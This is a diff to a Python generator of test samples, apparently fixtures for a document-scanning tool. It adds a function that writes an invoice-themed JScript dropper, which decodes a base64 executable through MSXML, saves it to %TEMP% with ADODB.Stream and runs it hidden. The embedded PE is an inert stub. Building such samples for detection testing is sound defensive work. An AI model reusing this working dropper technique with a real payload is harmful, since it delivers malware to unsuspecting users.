@@ -1228,6 +1228,36 @@ def crypto_loader_ps1() -> bytes:
     ]).encode("utf-8")
 
 
+def msxml_dropper_js() -> bytes:
+    """JScript dropper using THE classic binary-drop trick (inert): a PE (MZ +
+    text stub) in base64 decoded through MSXML (createElement + dataType
+    "bin.base64" + nodeTypedValue), written with a binary ADODB.Stream and run."""
+    import base64
+
+    pe = (b"MZ" + b"\x90" * 58 + (0x80).to_bytes(4, "little") + b"\x00" * 64
+          + b"This program cannot be run in DOS mode. Inert DocuTraceX stub (invoice-2024-0613). " * 4)
+    b64 = base64.b64encode(pe).decode()
+    chunks = [b64[i:i + 76] for i in range(0, len(b64), 76)]
+    lines = " +\n  ".join(f'"{c}"' for c in chunks)
+    return f"""// invoice viewer update
+var data =
+  {lines};
+var xml = new ActiveXObject("Msxml2.DOMDocument.6.0");
+var el = xml.createElement("b64");
+el.dataType = "bin.base64";
+el.text = data;
+var st = new ActiveXObject("ADODB.Stream");
+st.Type = 1;
+st.Open();
+st.Write(el.nodeTypedValue);
+var sh = new ActiveXObject("WScript.Shell");
+var path = sh.ExpandEnvironmentStrings("%TEMP%") + "\\\\invoice_viewer.exe";
+st.SaveToFile(path, 2);
+st.Close();
+sh.Run(path, 0, false);
+""".encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1236,7 +1266,7 @@ def build_all() -> dict[str, bytes]:
         "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
-        "sample_chain_dropper.js": chain_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
+        "sample_chain_dropper.js": chain_dropper_js(), "sample_msxml_dropper.js": msxml_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
         "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
